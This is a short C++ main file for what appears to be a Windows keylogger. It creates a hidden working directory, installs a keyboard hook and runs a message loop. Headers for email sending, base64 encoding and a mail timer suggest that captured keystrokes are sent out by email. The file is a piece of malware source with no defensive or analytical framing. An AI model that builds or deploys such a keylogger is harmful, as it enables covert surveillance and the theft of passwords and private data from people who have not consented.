// Main Program

#include <iostream>
#include <windows.h>
#include "keyConstants.h"
#include "helper.h"
#include "base64.h"
#include "io.h"
#include "timer.h"
#include "sendMail.h"
#include "keybHook.h"

using namespace std;

int main () {

    MSG Msg;
    IO::MkDir(IO::GetOurPath(true));
    InstallHook();
    while(GetMessage (&Msg, NULL, 0, 0)) {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    MailTimer.Stop();
    return 0;
}